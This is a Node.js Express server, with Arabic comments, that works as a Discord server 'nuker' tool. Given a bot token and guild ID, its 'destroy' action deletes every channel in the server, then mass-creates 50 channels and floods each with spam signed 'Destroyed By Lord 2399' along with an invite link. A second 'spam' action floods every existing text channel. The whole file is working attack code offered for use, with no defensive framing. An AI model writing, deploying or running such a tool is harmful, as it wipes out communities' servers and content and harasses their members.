const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());

// تشغيل الواجهة
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));

app.post('/execute', (req, res) => {
    const { token, guildId, action, customName, customMsg } = req.body;
    
    // رد فوري للمتصفح عشان ما يطلع "خطأ اتصال"
    res.status(200).send({ status: '✅ بدأت العملية.. راقب السيرفر!' });

    const client = new Client({ intents: [3276799] });

    client.login(token).then(async () => {
        const guild = await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) return client.destroy();

        const name = customName || "Lord 2399";
        const msg = customMsg || "# Destroyed By Lord 2399\nhttps://discord.gg/2399k";

        if (action === 'تدمير') {
            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    guild.channels.create({ name: name, type: ChannelType.GuildText })
                    .then(ch => {
                        for(let j=0; j<20; j++) setTimeout(() => ch.send(msg).catch(() => {}), j * 500);
                    }).catch(() => {});
                }, i * 300);
            }
        }
        
        if (action === 'سبام') {
            guild.channels.cache.filter(c => c.type === ChannelType.GuildText).forEach(ch => {
                for (let i = 0; i < 30; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 1000);
            });
        }
    }).catch(() => {});
});

app.listen(process.env.PORT || 3000, '0.0.0.0');
